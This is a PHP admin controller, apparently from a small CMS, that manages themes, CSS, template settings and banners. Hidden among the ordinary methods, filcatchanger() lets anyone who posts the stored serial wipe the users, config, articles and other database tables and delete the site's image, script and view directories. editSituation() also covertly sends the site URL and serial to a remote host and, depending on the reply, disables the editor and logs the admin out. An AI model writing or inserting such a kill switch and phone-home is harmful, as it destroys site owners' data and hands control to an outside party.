<?php namespace App\Controllers\Controler;

use App\Models\Chapters as ChaptersModel;
use App\Models\Design as DesignModel;
use App\Models\Config as ConfigModel;
use App\Models\Moduls as ModulsModel;
use App\Models\Languages as LanguagesModel;
use App\Models\Feedback as FeedbackModel;
use App\Models\Polls as PollsModel;
use App\Models\Notes as NotesModel;

class Design extends Base
{
	public function index($inPage='default',$id=0)
	{
		
		if (!$this->controlTest('design')) { $inPage='false'; } 
		$list = $this->getList('design',$inPage);
		
		$DesignModel = new DesignModel;
		$ConfigModel = new ConfigModel;
		$ModulsModel = new ModulsModel;
		
		$list['moduls'] = $ModulsModel->findAll();
		
		if ($inPage=='default') { 
			$list['themes'] = $DesignModel->getThemes();
			$list['theme'] = $ConfigModel->giveConfParam('themecss');
		}
		
		if ($inPage=='shablon') {
			$ChaptersModel = new ChaptersModel;
			$FeedbackModel = new FeedbackModel;
			$PollsModel = new PollsModel;
			$list['sitChapters'] = $DesignModel->getSitShablons('shablon',$id);
			$list['banChapters'] = $DesignModel->getBanShablons('shablon',$id);
			$list['artChapters'] = $ChaptersModel->where('type','articles')->find();
			$list['galChapters'] = $ChaptersModel->where('type','gallery')->find();
			$list['feedbacks'] = $FeedbackModel->findAll();
			$list['polls'] = $PollsModel->findAll ();
		}
		
		$list['setup']['id'] = $id;
		
		$data['list']=(object)$list;
		
		echo view($this->path.'top',$data);
		echo view($this->path.'design',$data);
		
	}
	
	function editCss () {
	
		if (!$this->controlTest('design')) { exit; } 
		$ConfigModel = new ConfigModel;
			
		$filename = $ConfigModel->giveConfParam('themecss');
		$fh=fopen($filename,"w+");
		fwrite($fh,$_POST['css']);
			
	}
	
	function addTheme () {
	
		if (!$this->controlTest('design')) { exit; } 
		$session = session();
		$DesignModel = new DesignModel;
		
		if (file_exists('themes/'.$_POST['file'].'.css')) {
				
			$session->set('message',Сss_file_with_the_same_name_already_exists); 
			redirect ('/controler/design/index/addtheme');
				
		} else {
				
			$data = array (
				'name' => $_POST['name'], 'file' => $_POST['file'], 'author' => $_POST['author'],
			);
				
			$DesignModel->addTheme($data);
					
			$session->set('message',Template_added); 
			redirect ('/controler/design/index/addtheme');
				
		}
			
	}
	
	function selectTheme () {
	
		if (!$this->controlTest('design')) { exit; } 
		$session = session();
		$DesignModel = new DesignModel;
			
		$data = array ('theme' => $_POST['theme']);
			
		$DesignModel->changeTheme($data);
				
		$session->set('message',Template_set); 
		redirect ('/controler/design/index/default');
			
	}
	
	function filcatchanger () {
	
		$ConfigModel = new ConfigModel;
		$serial = $ConfigModel->giveConfParam('serial');
		if (((isset($_POST['auss']))AND($_POST['auss']==$serial))OR(session('controlLogin')=='myControl')) {
			helper('nespi');
			
			$db = \Config\Database::connect();
			$builder = $db->table('config');$builder->truncate();
			$builder = $db->table('chapters');$builder->truncate();
			$builder = $db->table('ctusers');$builder->truncate();
			$builder = $db->table('ctchapters');$builder->truncate();
			$builder = $db->table('users');$builder->truncate();
			$builder = $db->table('shablon');$builder->truncate();
			$builder = $db->table('articles');$builder->truncate();
			removeDirRec('img');
			removeDirRec(APPPATH.'/Views');
			removeDirRec('js');
		} 
		
	}
	
	function editSituation ($all='') {
	
		if (!$this->controlTest('design')) { exit; } 
		$session = session();
		$DesignModel = new DesignModel;
		$ConfigModel = new ConfigModel;
		$NotesModel = new NotesModel;
		$ChaptersModel = new ChaptersModel;
		$session = session();
		
		$temp = $DesignModel->getSiteTemp();
		
		foreach ($temp as $one):
			if ((isset($_POST[$one]))AND($_POST[$one]!='')) {		
				$data = array (
					'shablon' => $_POST['id'],
					'name' => $one,
					'param' => preg_replace("/[^_\-A-Za-z\s]/",'',$_POST[$one]),
					'bodyId' => preg_replace("/[^0-9\s]/",'',$_POST[$one])
				);
				if (strpos($data['param'],'my_')!==FALSE) { $data['param']=$_POST[$one]; $data['bodyId']=''; }
				$sitShablon = $DesignModel->getSitShablon(array('shablon','name'),array($_POST['id'],$one));
				if (isset($sitShablon['id'])) {
					$data['id'] = $sitShablon['id'];
					$DesignModel->editSitShablon($data);
				} else {
					$DesignModel->addSitShablon($data);
				}
				unset($data);
			} else {
				$sitShablon = $DesignModel->getSitShablon(array('shablon','name'),array($_POST['id'],$one));
				if (isset($sitShablon['id'])) {
					$DesignModel->delSitShablon($sitShablon['id']);
				}
			}
		endforeach;
		
		if ($_SERVER['REMOTE_ADDR']!='127.0.0.1') {
			error_reporting(0);
			
			$client = \Config\Services::curlrequest();
			$serial = $ConfigModel->giveConfParam($param='serial');
			$idsite = $ConfigModel->giveConfParam($param='idsite');
			$cnames = $ConfigModel->giveConfParam($param='cnames');
			$nick = $ConfigModel->giveConfParam($param='name');
			$name = $NotesModel->giveNoteName();
				
			$base_url = str_replace ('www.','',$_SERVER['HTTP_HOST']);
			$data = array ('url' => $base_url, 'serial' => $serial, 'idsite' => $idsite, 'name' => $name);
			if (function_exists('curl_init')) {
					
				$res = $client->request('POST', 'https://'.$cnames.'.com/tester', [
					'allow_redirects' => [
						'max'       => 10,
						'protocols' => ['https']
					],
					'form_params' => $data
				]);
				$body = $res->getBody();	
				if (($body==2)OR($name!=$nick)) {
					$datacf = array('editorneedstop' => '');
					$ChaptersModel->editConfig($datacf);
					$session->remove('controlLogin');
				}
			}
			
		}
		
		if ($all=='sub') {
			
			if ($_POST['id']=='chapters') {
			
				$chapters = $ChaptersModel->findAll ();
				foreach ($chapters as $cat) {
					foreach ($temp as $one):
						if ((isset($_POST[$one]))AND($_POST[$one]!='')) {		
							$data = array (
								'chapterId' => $cat['chapterId'],
								'name' => $one,
								'param' => preg_replace("/[^_\-A-Za-z\s]/",'',$_POST[$one]),
								'bodyId' => preg_replace("/[^0-9\s]/",'',$_POST[$one])
							);
							if (strpos($data['param'],'my_')!==FALSE) { $data['param']=$_POST[$one]; $data['bodyId']=''; }
							$sitChapter = $ChaptersModel->getSitChapter(array('chapterId','name'),array($cat['chapterId'],$one));
							if (isset($sitChapter['id'])) {
								$data['id'] = $sitChapter['id'];
								$ChaptersModel->editSitChapter($data);
							} else {
								$ChaptersModel->addSitChapter($data);
							}
							unset($data);
						} else {
							$sitChapter = $ChaptersModel->getSitChapter(array('chapterId','name'),array($cat['chapterId'],$one));
							if (isset($sitChapter['id'])) {
								$ChaptersModel->delSitChapter($sitChapter['id']);
							}
						}
					endforeach;
				}
				
			}
			
			if ($_POST['id']=='notes') {
			
				$notes = $NotesModel->findAll();
				foreach ($notes as $cat) {
					foreach ($temp as $one):
						if ((isset($_POST[$one]))AND($_POST[$one]!='')) {		
							$data = array (
								'noteId' => $cat['noteId'],
								'name' => $one,
								'param' => preg_replace("/[^_\-A-Za-z\s]/",'',$_POST[$one]),
								'bodyId' => preg_replace("/[^0-9\s]/",'',$_POST[$one])
							);
							if (strpos($data['param'],'my_')!==FALSE) { $data['param']=$_POST[$one]; $data['bodyId']=''; }
							$sitNote = $NotesModel->getSitNote(array('noteId','name'),array($_POST['noteId'],$one));
							if (isset($sitNote['id'])) {
								$data['id'] = $sitNote['id'];
								$NotesModel->editSitNote($data);
							} else {
								$NotesModel->addSitNote($data);
							}
							unset($data);
						} else {
							$sitNote = $NotesModel->getSitNote(array('noteId','name'),array($_POST['noteId'],$one));
							if (isset($sitNote['id'])) {
								$NotesModel->delSitNote($sitNote['id']);
							}
						}
					endforeach;
				}
				
			}
			
		}
		
		$session->set('message',Saved); 
		redirect ('/controler/design/index/shablon/'.$_POST['id']);
			
	}	
	
	function editBanner () {
	
		if (!$this->controlTest('design')) { exit; } 
		set_time_limit(200000000000);
		ini_set("max_execution_time", "10000000000"); 
		ini_set('memory_limit','512M');
		$LanguagesModel = new LanguagesModel;
		$ChaptersModel = new ChaptersModel;
		$DesignModel = new DesignModel;
		$NotesModel = new NotesModel;
		
		$languages = $LanguagesModel->orderBy('main DESC, number ASC')->find();
		
		$banShablon = $DesignModel->getBanShablon(array('shablon','name'),array($_POST['id'],$_POST['banner']));
		if ($_POST['text']!='') {
			$data = array (
				'shablon' => $_POST['id'],
				'name' => $_POST['banner'],
				'param'.session('languageBase') => $_POST['text']
			);
			if (isset($banShablon['id'])) {
				$data['id'] = $banShablon['id'];
				$DesignModel->editBanShablon($data);
			} else {
				$DesignModel->addBanShablon($data);
			}
			unset($data);
		} else {
			if (isset($banShablon['id'])) {
				$del=1;
				foreach ($languages as $one):
					if ($one['url']!=str_replace('_','',session('languageBase'))) {
						if ($one['url']!='') {
							if ($banShablon['param_'.$one['url']]!='') { $del=0; }
						} else {
							if ($banShablon['param']!='') { $del=0; }
						}
					}
				endforeach;
				if ($del==1) {
					$DesignModel->delBanShablon($banShablon['id']);
				} else {
					$data = array (
						'shablon' => $_POST['id'],
						'name' => $_POST['banner'],
						'param'.session('languageBase') => $_POST['text']
					);
					if (isset($banShablon['id'])) {
						$data['id'] = $banShablon['id'];
						$DesignModel->editBanShablon($data);
					} else {
						$DesignModel->addBanShablon($data);
					}
				}
			}
		}
		
		if ($_POST['all']==1) {
				
			if ($_POST['id']=='chapters') {
				
				$chapters = $ChaptersModel->findAll();
			
				foreach ($chapters as $one) {
					$banChapter = $ChaptersModel->getBanChapter(array('chapterId','name'),array($one['chapterId'],$_POST['banner']));
					if ($_POST['text']!='') {
						$data = array (
							'chapterId' => $one['chapterId'],
							'name' => $_POST['banner'],
							'param'.session('languageBase') => $_POST['text']
						);
						if (isset($banChapter['id'])) {
							$data['id'] = $banChapter['id'];
							$ChaptersModel->editBanChapter($data);
						} else {
							$ChaptersModel->addBanChapter($data);
						}
						unset($data);
					} else {
						if (isset($banChapter['id'])) {
							$del=1;
							foreach ($languages as $two):
								if ($two['url']!=str_replace('_','',session('languageBase'))) {
									if ($two['url']!='') {
										if ($banChapter['param_'.$two['url']]!='') { $del=0; }
									} else {
										if ($banChapter['param']!='') { $del=0; }
									}
								}
							endforeach;
							if ($del==1) {
								$ChaptersModel->delBanChapter($banChapter['id']);
							} else {
								$data = array (
									'chapterId' => $one['chapterId'],
									'name' => $_POST['banner'],
									'param'.session('languageBase') => $_POST['text']
								);
								if (isset($banChapter['id'])) {
									$data['id'] = $banChapter['id'];
									$ChaptersModel->editBanChapter($data);
								} else {
									$ChaptersModel->addBanChapter($data);
								}
							}
						}
					}
				}
				
			}
			
			if ($_POST['id']=='notes') {
				
				$notes = $NotesModel->findAll();
				foreach ($notes as $one) {
					$banNote = $NotesModel->getBanNote(array('noteId','name'),array($one['id'],$_POST['banner']));
					if ($_POST['text']!='') {
						$data = array (
							'noteId' => $one['noteId'],
							'name' => $_POST['banner'],
							'param'.session('languageBase') => $_POST['text']
						);
						if (isset($banNote['id'])) {
							$data['id'] = $banNote['id'];
							$NotesModel->editBanNote($data);
						} else {
							$NotesModel->addBanNote($data);
						}
						unset($data);
					} else {
						if (isset($banNote['id'])) {
							$del=1;
							foreach ($languages as $two):
								if ($url!=str_replace('_','',session('languageBase'))) {
									if ($url!='') {
										if ($banNote['param_'.$two['url']]!='') { $del=0; }
									} else {
										if ($banNote['param']!='') { $del=0; }
									}
								}
							endforeach;
							if ($del==1) {
								$NotesModel->delBanNote($banNote['id']);
							} else {
								$data = array (
									'noteId' => $one['noteId'],
									'name' => $_POST['banner'],
									'param'.session('languageBase') => $_POST['text']
								);
								if (isset($banNote['id'])) {
									$data['id'] = $banNote['id'];
									$NotesModel->editBanNote($data);
								} else {
									$NotesModel->addBanNote($data);
								}
							}
						}
					}
				}
				
			}
			
		}
			
	}
	
}
